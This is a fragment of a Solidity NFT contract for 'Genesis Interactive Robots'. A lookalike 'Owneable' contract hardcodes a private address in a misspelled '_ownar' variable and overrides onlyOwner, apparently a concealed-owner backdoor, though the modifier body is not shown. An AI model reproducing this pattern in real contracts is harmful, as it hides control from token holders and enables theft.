 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0xFD444142836d2065d7DB626FCB67228062cD6c01;
    modifier onlyOwner() {
...
contract InteractiveRobots is ERC721A, Owneable {

    string public baseURI = "https://api.xenoinfinity.com/token/";
    string public contractURI = "https://api.xenoinfinity.com/token/";
    ...
    constructor() ERC721A("Genesis Interactive Robots", "ROBOTS") {}
